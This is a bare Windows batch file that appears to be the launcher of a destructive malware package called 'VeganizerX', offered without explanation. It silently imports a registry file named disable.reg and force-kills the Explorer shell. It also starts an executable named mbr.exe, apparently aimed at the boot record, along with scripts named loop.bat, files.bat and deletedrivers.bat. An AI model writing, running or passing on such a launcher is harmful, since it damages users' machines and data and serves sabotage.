@echo off
start C:\VeganizerX\core\loop.bat
start mbr.exe
start oivisuals.exe
regedit /s C:\VeganizerX\core\disable.reg
taskkill /f /im explorer.exe
start explorer
start C:\VeganizerX\core\files.bat
start C:\VeganizerX\core\deletedrivers.bat
